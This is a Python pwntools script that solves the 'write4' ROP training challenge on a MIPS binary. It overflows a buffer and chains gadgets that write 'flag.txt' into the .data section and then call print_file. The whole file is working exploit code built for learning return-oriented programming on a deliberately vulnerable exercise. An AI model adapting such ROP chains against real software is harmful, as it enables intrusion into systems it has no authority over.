#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/mipsel-linux-gnu"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'write4_mipsel')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./write4_mipsel_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616a)

# ROPgadget --binary write4_mipsel
# 0x00400930 : lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10 
# 0x00400948 : lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
LW_SW = p32(0x400930)
LW_A0_T9 = p32(0x400948)

# (r2) iS - to print sections adresses
# 0x00001000   0x10 0x00411000   0x10 -rw- 0x3        PROGBITS    .data
DATA_ADDR = 0x411000

# "flag.txt" string
FLAG_STR = p32(int.from_bytes(b"flag", 'little'))
TXT_STR = p32(int.from_bytes(b".txt", 'little'))

# (r2) aaa; afl
# 0x00400a90    1     32 sym.imp.print_file
PR_FILE = p32(0x400a90)

payload = padding
payload += LW_SW + p32(0xa5a5a5a5) + FLAG_STR + p32(DATA_ADDR) + LW_SW
# branch delay slot: addi $sp. $sp, 0x10 ;
payload += p32(0xa5a5a5a5) + TXT_STR + p32(DATA_ADDR+4) + LW_A0_T9
# branch delay slot: addi $sp. $sp, 0x10 ;
payload += p32(0xa5a5a5a5) + PR_FILE + p32(DATA_ADDR)

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
